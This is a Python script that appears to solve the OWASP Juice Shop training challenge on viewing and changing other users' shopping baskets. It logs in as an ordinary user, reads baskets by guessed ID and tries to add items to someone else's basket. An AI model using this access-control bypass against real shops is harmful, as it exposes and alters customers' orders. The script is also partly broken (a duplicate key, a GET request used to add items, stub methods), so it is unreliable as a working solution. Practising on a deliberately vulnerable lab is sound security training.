"""
This file is used to solve the OWASP Juice-shop Task
VIEW BASKET
MANIPULATE BASKET
GOAL: to view or manipulate on other people's basket
METHODOLOGY:
step1. login to any user that is not admin
    Hint: we can use the user created in repetitive registration
step2. .....
"""

from plugins import attack as a
from plugins import test_user_login as usrLogin
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class test_view_basket_class(a.attack_inter):
    def __init__(self):
        self.juice_session = a.requests.session()
        self.basketId = "10" ## we may use some methods to find our or other's basketId, otherwise it will return error
        usr = usrLogin.test_user_login_class()
        res, self.cookie, self.header = usr.run()

    def generator(self):
        json_data = {
            'bid': '3',
        }
        return json_data

    def view_basket_old(self):
        print('----------------------------------------')
        print('THis is old version')
        print("Let us view other's basket ------------")
        json_data = self.generator()
        url = a.URL + '/rest/basket/' + str(self.basketId)
        response = self.juice_session.get(url, cookies=self.cookie, headers=self.header, json = json_data)
        if response.status_code == 200:
            print(response.text)
        print(response.status_code)

    def check_basketId(self, basetId):
        return True

    def view_basket(self, basektId):
        print('----------------------------------------')
        print("Let us view basket {} ------------------".format(basektId))
        try:
            url = a.URL + '/rest/basket/' + basektId
            response = self.juice_session.get(url, cookies=self.cookie, headers=self.header)
            print(response.text)
        except:
            print("1")
    def addto_others_basket(self, other_basektId):
        print('----------------------------------------')
        print("Let us add to basket {} ----------------".format(other_basektId))
        try:
            json_data = {
                'ProductId': 8, ## you need to check this productID is valid
                'BasketId': self.basketId,
                'BasketId': other_basektId,
                'quantity': 1,
            }
            url = a.URL + '/api/BasketItems/'
            response = self.juice_session.get(url, cookies=self.cookie, headers=self.header,json = json_data)
            print(response.text)
        except:
            print("2")

    def manipulate_basket(self):
        pass

    def run(self):
        self.view_basket(self.basketId)
        self.addto_others_basket("2")
        self.view_basket("2")


